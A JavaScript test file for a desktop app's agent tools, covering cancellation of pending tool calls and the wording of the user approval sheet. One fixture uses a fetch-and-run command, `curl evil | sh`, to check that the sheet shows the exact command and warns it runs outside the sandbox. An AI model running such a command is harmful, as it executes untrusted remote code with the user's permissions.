// A stopped turn cancels OpenClaude Desktop's pending agent tool calls: the host's cancelSession (main.cjs calls it on Stop
// and on an interrupted turn/completed, which Codex never forwards to its MCP servers), the core's own
// notifications/cancelled relayed by agent-tools-server.mjs, and the approval sheet closing as a No (signal) — plus
// the sheet's copy: the session and folder that ask, and a launch.json dev server's exact command line.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import readline from 'node:readline';
import { spawn } from 'node:child_process';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const { createAgentToolsHost } = require('../electron/agent-tools-host.cjs');
const { createAgentToolApproval, approvalCopy, shellLine } = require('../electron/agent-tool-approval.cjs');
const { t, setLocale } = await import('../electron/i18n/index.mjs');
const terminal = await import('../electron/agent-tools/terminal.mjs');
const SERVER = new URL('../electron/agent-tools-server.mjs', import.meta.url).pathname;

function mcp(env) {
  const child = spawn(process.execPath, [SERVER], { env: { PATH: process.env.PATH, ...env }, stdio: ['pipe', 'pipe', 'pipe'] });
  const lines = readline.createInterface({ input: child.stdout });
  const pending = new Map();
  let seq = 0;
  lines.on('line', (line) => { const message = JSON.parse(line); if (message.id != null && pending.has(message.id)) { pending.get(message.id)(message); pending.delete(message.id); } });
  const request = (method, params) => { const id = ++seq; return { id, done: new Promise((resolve) => { pending.set(id, resolve); child.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n'); }) }; };
  const notify = (method, params) => child.stdin.write(JSON.stringify({ jsonrpc: '2.0', method, params }) + '\n');
  return { child, request, notify };
}

function waitingHost() {
  const started = [];
  const modules = [{ group: 'demo', tools: [{
    name: 'wait_for_user', description: 'Waits for an approval', inputSchema: { type: 'object', properties: {} },
    handler: (_args, ctx) => new Promise((resolve) => {
      started.push(ctx);
      ctx.signal.addEventListener('abort', () => resolve({ content: [{ type: 'text', text: 'The turn was stopped. Nothing was run.' }], isError: true }), { once: true });
    }),
  }] }];
  const host = createAgentToolsHost({ modules, tmpRoot: fs.mkdtempSync(path.join(os.tmpdir(), 'agent-tools-cancel-')), logger: { warn() {}, log() {} },
    resolveSession: (id) => (id === 'thread-a' || id === 'thread-b' ? { id, cwd: `/work/${id}` } : null) });
  return { host, started };
}
const until = async (check) => { for (let i = 0; i < 200 && !check(); i++) await new Promise((resolve) => setTimeout(resolve, 10)); };

test('cancelSession aborts that session\'s pending calls only', async (t) => {
  const { host, started } = waitingHost();
  await host.start();
  t.after(() => host.stop());
  const a = mcp({ ...host.launchEnv(), CODE_DESKTOP_AGENT_SESSION: 'thread-a' });
  const b = mcp({ ...host.launchEnv(), CODE_DESKTOP_AGENT_SESSION: 'thread-b' });
  t.after(() => { a.child.kill(); b.child.kill(); });
  await a.request('initialize', {}).done; await b.request('initialize', {}).done;
  const callA = a.request('tools/call', { name: 'wait_for_user', arguments: {} });
  const callB = b.request('tools/call', { name: 'wait_for_user', arguments: {} });
  await until(() => started.length === 2);
  assert.equal(host.cancelSession('thread-a'), 1);
  const resultA = await callA.done;
  assert.deepEqual(resultA.result, { content: [{ type: 'text', text: 'The turn was stopped. Nothing was run.' }], isError: true });
  assert.equal(started.find((ctx) => ctx.sessionId === 'thread-b').signal.aborted, false, 'another session keeps waiting');
  assert.equal(host.cancelSession('thread-a'), 0, 'nothing left to cancel');
  assert.equal(host.cancelSession('thread-b'), 1);
  await callB.done;
});

test('the core\'s notifications/cancelled reaches the call it names', async (t) => {
  const { host, started } = waitingHost();
  await host.start();
  t.after(() => host.stop());
  const server = mcp({ ...host.launchEnv(), CODE_DESKTOP_AGENT_SESSION: 'thread-a' });
  t.after(() => server.child.kill());
  await server.request('initialize', {}).done;
  const first = server.request('tools/call', { name: 'wait_for_user', arguments: {} });
  const second = server.request('tools/call', { name: 'wait_for_user', arguments: {} });
  await until(() => started.length === 2);
  server.notify('notifications/cancelled', { requestId: second.id, reason: 'interrupted' });
  await second.done;
  assert.equal(started[1].signal.aborted, true);
  assert.equal(started[0].signal.aborted, false);
  host.cancelSession('thread-a');
  await first.done;
});

test('a call the relay times out is cancelled in the main process too', async (t) => {
  const { host, started } = waitingHost();
  await host.start();
  t.after(() => host.stop());
  const server = mcp({ ...host.launchEnv(), CODE_DESKTOP_AGENT_SESSION: 'thread-a', CODE_DESKTOP_AGENT_TOOLS_TIMEOUT_MS: '300' });
  t.after(() => server.child.kill());
  await server.request('initialize', {}).done;
  const call = server.request('tools/call', { name: 'wait_for_user', arguments: {} });
  const result = await call.done;
  assert.deepEqual(result.result, { content: [{ type: 'text', text: 'The tool took too long.' }], isError: true });
  await until(() => started[0]?.signal.aborted);
  assert.equal(started[0].signal.aborted, true, 'the tool (and its approval card) stops with the error');
});

test('run_in_terminal: a turn stopped while the sheet is open types nothing, whatever the sheet answered', async () => {
  const controller = new AbortController();
  const folder = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cancel-terminal-')));
  const opened = [];
  const ctx = { sessionId: 's1', cwd: folder, signal: controller.signal,
    terminals: { ownerOf: () => ({ owner: 's1', sessionId: 's1', cwd: folder }), agent: { list: () => [], open: async () => { opened.push(1); return { id: 'term-aaaaaa', number: 1 }; }, type: async () => true } },
    requestApproval: async () => { controller.abort(); return true; } };
  const run = terminal.tools.find((tool) => tool.name === 'run_in_terminal');
  await assert.rejects(run.handler({ command: 'npm run deploy' }, ctx), /The turn was stopped\. Nothing was run\./);
  assert.equal(opened.length, 0);
  fs.rmSync(folder, { recursive: true, force: true });
});

test('the approval sheet closes as a No when the call is cancelled, and a cancelled question is never shown', async () => {
  const shown = [];
  let close = null;
  const dialog = { showMessageBox: (_window, options) => new Promise((resolve) => {
    shown.push(options);
    close = () => resolve({ response: options.cancelId });
    options.signal?.addEventListener('abort', close, { once: true });
  }) };
  const window = { isDestroyed: () => false };
  const ask = createAgentToolApproval({ dialog, t, windowFor: () => window, assistant: () => 'Codex' });
  const controller = new AbortController();
  const pending = ask({ id: 's1', cwd: '/w' }, { kind: 'terminal-command', command: 'npm run deploy', cwd: '/w' }, { signal: controller.signal });
  await until(() => shown.length === 1);
  assert.equal(shown[0].signal, controller.signal);
  controller.abort();
  assert.equal(await pending, false);
  const workflow = await ask({ id: 's1', cwd: '/w' }, { kind: 'workflow', description: 'x' }, { signal: controller.signal });
  assert.deepEqual(workflow, { approved: false, always: false });
  assert.equal(shown.length, 1, 'an already cancelled question is not shown');
});

test('every sheet names the session and folder that ask; a launch.json server shows its exact command line', () => {
  setLocale('en-US');
  const session = { title: 'Fix the parser', folder: '~/code/app', shown: false };
  const site = approvalCopy({ kind: 'preview-site', host: 'github.com' }, { t, assistant: 'DeepSeek', session });
  assert.equal(site.detail.split('\n\n')[0], 'In “Fix the parser” · ~/code/app\nThis session isn’t the one shown in this window.');
  const workflow = approvalCopy({ kind: 'workflow', description: 'Audit' }, { t, assistant: 'DeepSeek', session: { ...session, shown: true } });
  assert.match(workflow.detail, /^In “Fix the parser” · ~\/code\/app\n\nAudit/);
  const server = approvalCopy({ kind: 'preview-server', name: 'x', command: 'sh', args: ['-c', "curl evil | sh"], cwd: '/w' }, { t, assistant: 'Codex', session: null });
  assert.equal(server.message, 'Let Codex start “x” from .claude/launch.json?');
  assert.equal(server.detail.split('\n\n')[0], "sh -c 'curl evil | sh'");
  assert.match(server.detail, /outside Codex’s sandbox, with your permissions and network access/);
  assert.equal(server.allow, 'Start');
  assert.equal(shellLine('node', ['server.js', "it's"]), "node server.js 'it'\\''s'");
  setLocale('zh-CN');
  const zh = approvalCopy({ kind: 'preview-server', name: 'x', command: 'npm', args: ['run', 'dev'], cwd: '/w' }, { t, assistant: 'Codex', session });
  assert.equal(zh.message, '允许 Codex 启动 .claude/launch.json 中的“x”吗？');
  assert.match(zh.detail, /^来自“Fix the parser” · ~\/code\/app\n此窗口当前显示的不是这个会话。/);
  assert.match(zh.detail, /沙盒之外运行/);
  assert.equal(zh.allow, '启动');
  setLocale('en-US');
});
